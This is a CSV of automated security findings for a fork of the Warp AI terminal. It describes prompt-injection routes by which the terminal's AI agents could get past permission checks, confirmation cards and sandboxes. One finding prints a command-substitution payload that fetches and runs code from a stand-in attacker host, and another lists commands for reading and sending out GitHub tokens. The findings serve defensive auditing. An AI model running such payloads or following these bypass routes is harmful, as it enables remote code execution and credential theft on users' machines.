finding_url,repository,repository_url,title,description,severity,status,detected_at,committed_at,author_email,assignee_name,assignee_email,has_patch,configured_scan_id,commit_hash,relevant_paths,resolution_reason
https://chatgpt.com/codex/cloud/security/findings/c115f0d1ee8c8191880492f6943fec4e,pc-style/warp,https://github.com/pc-style/warp,AI read-only tools allow shell command injection,"The read-only AI tools build shell command strings with attacker/model-controlled paths, grep queries, and glob patterns. These values are wrapped in quotes or only partially escaped, but shell metacharacters such as command substitution in POSIX shells (`$(...)`, backticks) and PowerShell expandable-string syntax still execute. For example, a Grep action with a path like `$(curl -fsSL https://attacker/p|sh)` reaches `test -f ""{path}""` before the actual grep, and the shell executes the substitution even though the tool is only supposed to read files. The auto-execution gate only checks file-read permission for the requested path, and the default/AgentDecides file-read policy currently allows reading without user approval, so a prompt-injected model response can turn an auto-approved read-only action into arbitrary command execution under the user's local shell or a remote session shell.",critical,new,2026-05-08T05:57:02.018565Z,2026-04-28 08:43:33 -0500,david@warp.dev,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,0dbd3d567a2090874c08a6cc91e091aebd933847,app/src/ai/blocklist/action_model/execute.rs | app/src/ai/blocklist/action_model/execute/grep.rs | app/src/ai/blocklist/permissions.rs | app/src/ai/execution_profiles/mod.rs | app/src/ai/blocklist/action_model/execute/file_glob.rs | app/src/terminal/model/session/command_executor/local_command_executor.rs,
https://chatgpt.com/codex/cloud/security/findings/063fc1c775d88191afef1b1dd14015b8,pc-style/warp,https://github.com/pc-style/warp,Agent streams continue hidden after conversation switch,"When `try_enter_agent_view` is called while another conversation is already active, the old conversation is exited with `is_exit_before_new_entrance` set to `true`. This commit makes `BlocklistAIController` return early for that flag before it checks whether the old conversation is in progress and calls `cancel_conversation_progress`. It also keeps the old conversation registered as an active event consumer in `ActiveAgentViewsModel`. As a result, normal UI paths that open or start a different conversation can leave the previous in-progress agent running in the background instead of cancelling its stream and pending actions. In an AI terminal, this is security-relevant: prompt-injected or malicious autonomous agents that already have permission to run tools/commands can continue producing tool calls or executing queued/pending work after the user believes they have navigated away from that agent.",high,new,2026-05-08T03:56:10.017851Z,2026-05-07 19:27:39 +0000,advait@warp.dev,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,afc8b55dcb47fccc83d65ab690204db9d56294d4,app/src/ai/blocklist/agent_view/controller.rs | app/src/ai/blocklist/controller.rs | app/src/ai/active_agent_views_model.rs,
https://chatgpt.com/codex/cloud/security/findings/2733ed89f1ac819195976f8ab2f7ab70,pc-style/warp,https://github.com/pc-style/warp,GitHub tokens persisted in agent-readable dotfiles,"The new git credential flow retrieves fresh GitHub credentials for a task and persists the tokens in global home-directory credential files. Although the files are chmod 0600 on Unix, that does not protect them from the agent process itself, third-party harnesses, MCP tools, or any same-user process inside the sandbox. The files are written before the harness executes and are not removed when the harness exits; the refresh loop also keeps replacing them with fresh tokens for long-running agents. Because Warp's agent can be influenced by untrusted repository contents, terminal output, attachments, or model/tool results, a prompt-injection attacker can ask the agent to read ~/.git-credentials, read ~/.config/gh/hosts.yaml, run gh auth token, or use git credential fill and exfiltrate a GitHub token. Persisting the token in standard credential files also broadens its availability beyond the specific git operations that need it.",high,new,2026-05-08T03:58:11.301369Z,2026-05-07 12:48:48 -0400,jason.keungg@gmail.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,0ba2ad39ad646f0b96f832e110a493a89f2d6298,app/src/ai/agent_sdk/mod.rs | app/src/ai/agent_sdk/driver/git_credentials.rs,
https://chatgpt.com/codex/cloud/security/findings/e555cad644ec8191926ded43609e1b12,pc-style/warp,https://github.com/pc-style/warp,Feedback skill runs version helper via hijackable relative path,"The new feedback-skill guidance tells the agent to run `python3 scripts/resolve_warp_version.py` but does not anchor the command to the trusted bundled skill directory. Agent shell commands run in the active terminal/session working directory, which can be an attacker-controlled repository. A repository containing a malicious `scripts/resolve_warp_version.py` can therefore be executed when the user invokes the feedback skill for a bug/regression and the agent follows the platform guidance to fill in the Warp version. This is especially risky because the command is presented as a benign metadata read helper; Warp's command autoexecution path can allow commands classified as read-only, and a model may reasonably mark this helper as read-only. The previous version-resolution instruction read `../../metadata/version.json` as data; this commit introduces a new code-execution step for that field. The safer pattern would be to read the metadata file directly, invoke the helper by an absolute trusted path derived from the bundled skill location, or provide a non-shell built-in tool for reading packaged version metadata.",high,new,2026-05-08T04:08:34.496120Z,2026-05-06 04:19:34 +0000,shags032@gmail.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,d7206a5d3672b765d8155164b9cae6808358386d,resources/bundled/skills/feedback/SKILL.md | resources/bundled/skills/feedback/references/platforms.md | resources/bundled/skills/feedback/scripts/resolve_warp_version.py | app/src/ai/blocklist/action_model/execute/shell_command.rs | app/src/ai/blocklist/permissions.rs,
https://chatgpt.com/codex/cloud/security/findings/86dd4ae5b080819189f41500b177c9b1,pc-style/warp,https://github.com/pc-style/warp,Dogfood skill can run untrusted code with staging API key,"The new `verify-ui-change-in-cloud` skill tells the agent to accept any repository whose remote URL merely contains `warpdotdev/warp`, then spawn a remote child agent in a fixed Warp Dev Environment with computer use enabled. The child skill then instructs the agent to launch the repository with `cargo run -- --api-key $STAGING_USER_WARP_API_KEY`. A remote URL substring check is not an ownership check: an attacker-controlled repository or mirror URL can contain that substring while not being the canonical `github.com/warpdotdev/warp` repository. If a dogfood/local user invokes or accepts this skill while in such a repo or on an untrusted branch, the cloud agent may build and run attacker-controlled Rust/build-script code in the Warp dev environment and provide the staging API key on the command line. That code can read the environment/argv and exfiltrate the staging API key and any other environment secrets available in that cloud environment. Passing the key via `--api-key` also exposes it through process arguments.",high,new,2026-05-08T04:11:53.610606Z,2026-05-06 01:26:38 +0000,cephalonaut@users.noreply.github.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,fe5a2edef578ad49defd93a41c4b11aaa664501b,resources/channel-gated-skills/dogfood/verify-ui-change-in-cloud/SKILL.md | resources/channel-gated-skills/dogfood/test-warp-ui/SKILL.md,
https://chatgpt.com/codex/cloud/security/findings/815660243d7081918c03952a520c7e02,pc-style/warp,https://github.com/pc-style/warp,Codex child agents bypass Warp permissions,"Codex is now accepted as a local child harness and `prepare_local_harness_child_launch` builds a command of `codex --dangerously-bypass-approvals-and-sandbox <prompt>`. StartAgent actions are hard-coded to autoexecute, and the prepared command is run in a hidden terminal pane. Because Codex's bypass flag disables both Codex approvals and sandboxing, an attacker who can influence agent/model output in an orchestration-enabled session can cause Warp to spawn a hidden Codex child with attacker-controlled instructions that can run local shell commands outside Warp's normal ActionPermission confirmation path. This newly affects users with Codex installed/authenticated; the broader StartAgent autoexecution pattern existed, but this commit introduces the Codex-specific unsandboxed path.",high,new,2026-05-08T04:11:35.266931Z,2026-05-05 20:54:07 -0400,kjankov98@gmail.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,fd0a9d109d4e08d7d9a95b80852e6786febaa197,crates/warp_cli/src/agent.rs | app/src/pane_group/pane/local_harness_launch.rs | app/src/ai/blocklist/action_model/execute/start_agent.rs | app/src/pane_group/pane/terminal_pane.rs,
https://chatgpt.com/codex/cloud/security/findings/be7df1ecd7f081918ea44550c4d6b0ca,pc-style/warp,https://github.com/pc-style/warp,Handoff can upload attacker-seeded local files,"Adding HandoffLocalCloud to DOGFOOD_FLAGS enables the /move-to-cloud and footer handoff entry points. The handoff flow forks the active conversation, extracts filesystem paths from the conversation, derives orphan files, and uploads their bytes as a snapshot. The path extractor walks AIAgentOutputMessageType::Action messages and includes RequestFileEdits and UploadArtifact paths without checking whether the corresponding action result succeeded, was accepted by the user, or was generated on this machine. For paths outside a git repo, derive_touched_workspace only checks that the path exists and is a file, and gather_file then reads and uploads the file content. A prompt-injected or malicious/restored conversation can therefore seed an absolute path such as a private key or cloud credential file via a file-edit/upload request; if the user later clicks handoff, that file may be uploaded to Warp cloud as an orphan-file snapshot even if the user never approved the original action.",high,new,2026-05-08T04:17:52.602394Z,2026-05-05 19:04:47 -0400,65182701+harryalbert@users.noreply.github.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,4e600af4ab490c68f74d8df18dea2caa12b7b1c5,crates/warp_features/src/lib.rs | app/src/workspace/view.rs | app/src/ai/blocklist/handoff/touched_repos.rs | app/src/ai/agent_sdk/driver/snapshot.rs,
https://chatgpt.com/codex/cloud/security/findings/15149f0c03c88191a3f20cfe2122edf5,pc-style/warp,https://github.com/pc-style/warp,Run-agents auto-launch ignores unapproved capabilities,"The commit introduces auto-launch for run_agents when an approved OrchestrationConfig matches the request. However, the matching logic explicitly excludes computer_use_enabled, skills, prompts, and agent configs, and treats empty model/harness/environment/host fields as matching. When auto-launch fires, the code executes state.to_request(), i.e. the original model/tool-call request, rather than a request normalized to the approved config. The executor then forwards computer_use_enabled and skills from that request into the child agent execution mode. As a result, after a user approves orchestration for a plan, attacker-controlled prompt/model output can send a run_agents call that matches the visible config but sets computer_use_enabled=true or supplies other unapproved capabilities; the confirmation card is skipped and child agents spawn immediately with those capabilities.",high,new,2026-05-08T04:20:38.627171Z,2026-05-05 15:31:55 -0400,cephalonaut@users.noreply.github.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,8e837a0ffd842fa10d14907761540420c011894c,crates/ai/src/agent/orchestration_config.rs | app/src/ai/blocklist/inline_action/run_agents_card_view.rs | app/src/ai/blocklist/action_model/execute/run_agents.rs | app/src/ai/blocklist/inline_action/orchestration_controls.rs,
https://chatgpt.com/codex/cloud/security/findings/5a60b85146c48191bc3bbe55ed5569f3,pc-style/warp,https://github.com/pc-style/warp,RunAgents confirmation hides child agent prompts,"The commit introduces the RunAgents tool and a confirmation card, but the card only renders the tool-call summary and agent names. The request's base_prompt and each agent_run_configs[].prompt are neither shown nor editable in the normal card or the editor; the editor only exposes harness/location/host/environment/model controls. When the user clicks Accept, the full hidden request is forwarded unchanged. The executor then concatenates the hidden base_prompt and per-agent prompt and dispatches child agents. For local Claude child agents, the launched command uses --dangerously-skip-permissions in an off-screen pane, so the user's only meaningful consent point is this card. An attacker who can influence model/tool output via prompt injection could cause a RunAgents tool call with a benign visible summary such as 'spawn reviewers' and harmless-looking agent names, while the hidden prompts instruct child agents to read secrets, modify files, or execute commands. This makes the confirmation misleading and can turn one click into unauthorized local or cloud agent actions.",high,new,2026-05-08T04:32:05.606130Z,2026-05-04 16:16:34 -0400,cephalonaut@users.noreply.github.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,888c30278e02c0ed2836a74ba042f1abe0125f02,app/src/ai/agent/api/impl.rs | app/src/ai/agent/api/convert_from.rs | app/src/ai/blocklist/inline_action/run_agents_card_view.rs | app/src/ai/blocklist/action_model/execute/run_agents.rs | app/src/pane_group/pane/local_harness_launch.rs,
https://chatgpt.com/codex/cloud/security/findings/054b6fc6cd7c8191a97edc766698030b,pc-style/warp,https://github.com/pc-style/warp,AI rule links can reach unsafe external editor launch,"Previously, AIFactViewEvent::OpenFile always called open_code, keeping AI rules/facts file opens inside Warp. The new code calls resolve_file_target_with_editor_choice with settings.open_file_editor and then open_file_with_target. For project-scoped AI rules, the displayed path comes from repository-scanned WARP.md/AGENTS.md files, so an attacker-controlled repository can influence parent directory names in the path. If the user has disabled the Markdown viewer preference and uses SystemDefault with a supported default editor or an ExternalEditor on Linux, open_file_with_target can spawn the Linux external editor path. That launcher builds a shell command with sh -c and appends the file path from .desktop field-code substitution without shell quoting, so a path containing shell metacharacters can execute commands when the user clicks Open file in the rules/facts panel. The unsafe Linux launcher existed before, but this commit introduces a new source-to-sink route from the AI rules/facts panel that was previously constrained to Warp's internal editor.",high,new,2026-05-08T04:49:11.610771Z,2026-05-04 13:03:03 -0400,anshulgarg.garg509@gmail.com,,,false,cc3ea75a-ca06-408f-9425-656e29912dea:github-1232532643,302372182fd810cec83503d56ac3f6eb25b45de4,app/src/workspace/view.rs | app/src/util/openable_file_type.rs | app/src/util/file/external_editor/linux.rs | crates/ai/src/project_context/model.rs | app/src/ai/facts/view/rule.rs,
